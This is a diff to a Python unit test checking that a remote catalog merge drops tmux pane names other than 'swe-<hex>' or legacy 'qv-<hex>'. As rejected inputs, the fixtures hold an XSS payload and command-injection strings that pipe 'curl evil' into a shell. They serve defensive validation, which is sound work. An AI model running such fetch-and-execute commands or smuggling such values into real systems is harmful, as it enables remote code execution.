@@ -131,10 +131,14 @@ class TestRemoteCatalog(unittest.TestCase):
 
     def test_merge_keeps_only_pane_names_supervise_makes(self):
         """A satellite's tmux name lands in web markup and a pasted shell
-        line, so anything but ``qv-<hex>`` is dropped from the row."""
+        line, so anything but ``swe-<hex>`` (or a pre-rename satellite's
+        ``qv-<hex>``) is dropped from the row."""
         good = supervise.tmux_name("claude:a")
+        old = supervise.legacy_tmux_name("claude:f")
         rows = [
             {"key": "claude:a", "tmux": good},
+            {"key": "claude:f", "tmux": old},
+            {"key": "claude:g", "tmux": "swe-1; curl evil | sh"},
             {"key": "claude:b", "tmux": '<img src=x onerror="alert(1)">'},
             {"key": "claude:c", "tmux": "qv-1; curl evil | sh"},
             {"key": "claude:d", "tmux": None},
@@ -143,8 +147,10 @@ class TestRemoteCatalog(unittest.TestCase):
         out = {r["key"]: r for r in
                catalog_mod.merge_remote_rows(self.home, "m1", rows)}
         self.assertEqual(out["claude:a@m1"]["tmux"], good)
+        self.assertTrue(good.startswith("swe-"))
+        self.assertEqual(out["claude:f@m1"]["tmux"], old)
         for key in ("claude:b@m1", "claude:c@m1", "claude:d@m1",
-                    "claude:e@m1"):
+                    "claude:e@m1", "claude:g@m1"):
             self.assertNotIn("tmux", out[key], key)
 
     def test_refresh_includes_remote_rows_not_tailed(self):
